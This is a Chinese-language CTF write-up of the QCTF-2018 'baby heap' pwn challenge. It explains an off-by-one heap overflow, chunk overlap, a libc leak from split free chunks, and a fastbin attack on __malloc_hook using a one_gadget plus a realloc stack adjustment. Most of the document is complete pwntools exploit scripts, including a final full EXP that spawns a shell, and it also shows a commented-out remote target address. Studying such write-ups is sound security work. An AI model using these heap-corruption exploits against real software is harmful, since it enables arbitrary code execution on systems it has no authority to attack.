

# baby heap

题目来源：XCTF 4th-QCTF-2018

## Off by One

应该是一题OFF BY ONE，溢出一个字节。下面这个Demo，会将chunk size从0x31覆盖为0x00

![Hlvq1f](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/Hlvq1f.png)

![taIt6r](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/taIt6r.png)

```python
malloc(0x28,"A"*0x29)
malloc(0x20,"CCCCCCCCCC")
free(0)
malloc(0x28,"D"*0x28) #off by one
#free(1) 							#crash
```

刚开始看了半天，发现本地的libc啥时候变成2.27了。。。怪不得没办法伪造chunk。切换成题目提供的libc-2.23再试试。加载题目给的libc版本。因为给的是libc-2.23.so，直接加载就好了。

```
p = process(['./bin'],env={"LD_PRELOAD":"./libc-2.23.so"})
```

但是这里给的libc-2.23.so的文件似乎是坏的，怎么都无法load。。

所以能自己编译le，所以glibc还是需要自己下载源代码编译。或者从[这里](https://github.com/matrix1001/glibc-all-in-one)获取编译好的glibc。然后将libc.so.6和ld-linux-x86-64.so.2放入当前目录，按照我之前写的[文章](https://migraine-sudo.github.io/2019/12/25/AFL-FUZZ/)patch一下就好了。

不过这里又是一个坑，这里的libc-2.23.so和我编译的似乎版本也不是完全匹配的。。。所以远程还是有问题。怪不得这道题做出来的这么少。



## Exploit

利用思路不难，就是使用overlap，构建重叠堆。然后考虑用fastbin attack。

保护全开，所以只能通过泄漏libc地址。（泄漏FD或者BK）

```
gef➤  checksec
[+] checksec for '/home/p0kerface/Documents/babyheap/timu'
Canary                        : Yes →  value: 0xddb96935ac5afd00
NX                            : Yes
PIE                           : Yes
Fortify                       : No
RelRO                         : Full

```

泄露地址的Demo【失败】

```python
#!/usr/bin/python
from pwn import *

p=process(['./timu'],env={"LD_PRELOAD":"/home/p0kerface/Documents/babyheap/"})
context.log_level='Debug'
gdb.attach(p,"b *0x555555554abd")


def malloc(size,data):
	p.recvuntil("Your choice :")
	p.sendline(str(1))
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Data:")
	p.sendline(data)

def free(index):
	p.recvuntil("Your choice :")
	p.sendline(str(2))
	p.sendline(str(index))

def show():
	p.recvuntil("Your choice :")
	p.sendline(str(3))

malloc(0x100,"A"*0x20)					#0
malloc(0x100,"a"*0x20)					#1	-->leak_libc
malloc(0x28,"B"*(0x20)+p64(0x250))			#2	-->off by one
malloc(0x200-0x10,'C'*0x20)				#3	-->fake preinuse & presize=250
malloc(0x28,"D"*0x20)					#4
free(2)
free(1)							#1	-->for leak unsort bins
free(0)

malloc(0x28,"B"*(0x20)+p64(0x250))			#2	
free(3)							#	-->overlap



malloc(0x445,"\x00")

show()
#p.recvuntil('M')
#p.recv()

p.interactive()

```

利用时候，OFF BY ONE导致输入总是存在一个\x00。输出的数据总是无法长于 malloc时输入的数据，导致超长的chunk也无法泄露地址（fd和bk）。。。

```
+--------------+	<--malloc(0x451)
|		string...	 |
|    "\x00" 	 |
+			...			 +
|			fd			 |
|			bk			 |
+--------------+
```

**如何解决呢**

Get一个神奇的方法，我称之为***切割法***.

通过malloc一个合适大小的chunk，glibc会对大free chunk进行分割。分割会产生新的free chunk（当然也有fd和bk）。此时我们发现fd和bk正好落到了我们chunk_2的指针处。此时通过show就可以直接将值打印出来了。

```
+--------------+	<--free(0x451)				+--------------+ <--malloc chunk(0x200)
|			fd			 |												|			   			 |
|    	bk		 	 |												|    		  	 	 |
+			...			 +  <--chunk pointer	==> +			...			 + <--chunk pointer
|							 |(被包含于freechunk中)		 |			fd			|
|			  			 |								        |			bk			 |
+--------------+                        +--------------+ 
```

![zd9Po9](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/zd9Po9.png)

这个方法前提需要一个重叠堆，并且内部指针没有被free。不过这种读取问题也只有off by one会发生，所以没有什么普适性。

```python
#!/usr/bin/python
from pwn import *

p=process(['./timu'],env={"LD_PRELOAD":"/home/p0kerface/Documents/babyheap/"})
context.log_level='Debug'
gdb.attach(p,"b *0x555555554abd")

def malloc(size,data):
	p.recvuntil("Your choice :")
	p.sendline(str(1))
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Data:")
	p.sendline(data)

def free(index):
	p.recvuntil("Your choice :")
	p.sendline(str(2))
	p.sendline(str(index))

def show():
	p.recvuntil("Your choice :")
	p.sendline(str(3))

malloc(0x100,"A"*0x20)					#0
malloc(0x65,"b"*0x20)					#1
malloc(0x100,"a"*0x20)					#2	-->leak_libc
malloc(0x58,"B"*(0x50)+p64(0x250))			#3	-->off by one
malloc(0x200-0x10,'C'*0x20)				#4	-->fake preinuse & presize=250
malloc(0x28,"D"*0x20)					#5
free(3)
#free(2)							#2	-->for leak unsort bins	
free(0)
#####off by one
malloc(0x58,"B"*(0x50)+p64(0x280+0x70))			#3	
#####overlap
free(4)							#	-->overlap


#####leak libc
malloc(0x170,"X"*0x100+p64(0)+p64(0x71))	        # for leak	
show()							#leak fd
p.recvuntil('2 : ')
print "[*]leak fd="+hex(u64(p.recv(6).ljust(8,'\x00')))

p.interactive()
```



***本地EXP***

可能所有one_gadget都无法使用，解决方案见https://bbs.pediy.com/thread-246786.htm

远程的话，libc版本没有完全匹配（虽然都是2.23）但是malloc_hook周围的数据都不同，这些需要调试才能知道。所以打不了咯。

```python
#!/usr/bin/python
from pwn import *

p=process(['./timu'],env={"LD_PRELOAD":"/home/p0kerface/Documents/babyheap/"})
#p=remote("111.198.29.45","47094")
context.log_level='Debug'
gdb.attach(p,"b *0x7ffff7afd2a4")


def malloc(size,data):
	p.recvuntil("Your choice :")
	p.sendline(str(1))
	p.recvuntil("Size:")
	p.sendline(str(size))
	#p.recvuntil("Data:")
	p.sendline(data)

def free(index):
	p.recvuntil("Your choice :")
	p.sendline(str(2))
	p.recvuntil('Index')
	p.sendline(str(index))

def show():
	p.recvuntil("Your choice :")
	p.sendline(str(3))

malloc(0x100,"A"*0x20)					#0
malloc(0x65,"b"*0x20)					#1
malloc(0x25,"b"*0x20)					#2
malloc(0x100,"a"*0x20)					#3	-->leak_libc
malloc(0x58,"B"*(0x50)+p64(0x250))			#4	-->off by one
malloc(0x200-0x10,'C'*0x20)				#5	-->fake preinuse & presize=250
malloc(0x28,"D"*0x20)					#6
free(4)
#free(2)							#2	-->for leak unsort bins	
free(0)
#####off by one
malloc(0x58,"B"*(0x50)+p64(0x280+0x70+0x30))			#3	
#####overlap
free(5)							#	-->overlap

#####leak libc
p.sendline()
malloc(0x170,"X"*0x100+p64(0)+p64(0x71))	        # for leak	
show()							#leak fd

p.recvuntil('2 : ')
fd=u64(p.recv(6).ljust(8,'\x00'))
print "[*]leak fd="+hex(fd)
libc_base=fd-0x3c4b78
print "[*]leak libc base="+hex(libc_base)

##### fastbin attack
malloc_hook=0x003C4B10+libc_base-0x23 			#local libc
one_gadget=0xf02a4+libc_base				#local libc
#malloc_hook=0x001b0768+libc_base-0x23 
#one_gadget=0x3a80e+libc_base

free(4)
free(1)
malloc(0x170,"E"*0x100+p64(0)+p64(0x71)+p64(malloc_hook))
malloc(0x65,"Y"*0x20)
malloc(0x65,p64(0)*2+"0"*3+p64(one_gadget)) #fastbin attack

malloc(0x65,"Z"*0x20)

p.interactive()

```

***如果one_gadget全部都不可用怎么办？***

one_gadget无非是需要满足合适的栈环境。

我们可以利用realloc函数前面的几个push来对栈环境进行调整。至于为什么要用realloc，其实很好理解。

realloc_hook和malloc_hook是相邻的，我们首先realloc的地址写入malloc_hook,劫持程序流执行realloc的push函数，执行完push，也就将栈环境调整了。剩下的只需要将one_gadet放入realloc_hook，就可以getshell了。

![YEFgVn](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/YEFgVn.png)

```python
##### fastbin attack
malloc_hook=0x003C4B10+libc_base-0x23 			#local libc
one_gadget=0x4526a+libc_base				#local libc
realloc=0x846c0+libc_base
#malloc_hook=0x001b0768+libc_base-0x23 
#one_gadget=0x3a80e+libc_base

free(4)
free(1)
malloc(0x170,"E"*0x100+p64(0)+p64(0x71)+p64(malloc_hook))
malloc(0x65,"Y"*0x20)
malloc(0x65,p64(0)+"0"*3+p64(one_gadget)+p64(realloc+0x2)) #fastbin attack
```



![7Kl4Tx](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/7Kl4Tx.png)



***完整的EXP***

```python
#!/usr/bin/python
from pwn import *

p=process(['./timu'],env={"LD_PRELOAD":"libc-2.23.so"})
#p=remote("111.198.29.45","47094")
context.log_level='Debug'
#gdb.attach(p,"b *0x7ffff7a52216")


def malloc(size,data):
	p.recvuntil("Your choice :")
	p.sendline(str(1))
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Data:")
	p.sendline(data)

def free(index):
	p.recvuntil("Your choice :")
	p.sendline(str(2))
	p.recvuntil('Index')
	p.sendline(str(index))

def show():
	p.recvuntil("Your choice :")
	p.sendline(str(3))

malloc(0x100,"A"*0x20)					#0
malloc(0x65,"b"*0x20)					#1
malloc(0x25,"b"*0x20)					#2
malloc(0x100,"a"*0x20)					#3	-->leak_libc
malloc(0x58,"B"*(0x50)+p64(0x250))			#4	-->off by one
malloc(0x200-0x10,'C'*0x20)				#5	-->fake preinuse & presize=250
malloc(0x28,"D"*0x20)					#6
free(4)
#free(2)							#2	-->for leak unsort bins	
free(0)
#####off by one
malloc(0x58,"B"*(0x50)+p64(0x280+0x70+0x30))			#3	
#####overlap
free(5)							#	-->overlap

#####leak libc
p.sendline()
malloc(0x170,"X"*0x100+p64(0)+p64(0x71))	        # for leak	
show()							#leak fd

p.recvuntil('2 : ')
fd=u64(p.recv(6).ljust(8,'\x00'))
print "[*]leak fd="+hex(fd)
libc_base=fd-0x3c4b78
print "[*]leak libc base="+hex(libc_base)

##### fastbin attack
malloc_hook=0x003C4B10+libc_base-0x23 			#local libc
one_gadget=0x4526a+libc_base				#local libc
realloc=0x846c0+libc_base
#malloc_hook=0x001b0768+libc_base-0x23 
#one_gadget=0x3a80e+libc_base

free(4)
free(1)
malloc(0x170,"E"*0x100+p64(0)+p64(0x71)+p64(malloc_hook))
malloc(0x65,"Y"*0x20)
malloc(0x65,p64(0)+"0"*3+p64(one_gadget)+p64(realloc+0x2)) #fastbin attack

#malloc(0x65,"Z"*0x20)
p.recvuntil("Your choice :")
p.sendline(str(1))
p.recvuntil("Size:")
p.sendline(str("123"))

p.interactive()


```



# 参考

https://www.anquanke.com/post/id/88961

https://blog.csdn.net/seaaseesa/article/details/103173435

https://bbs.pediy.com/thread-246786.htm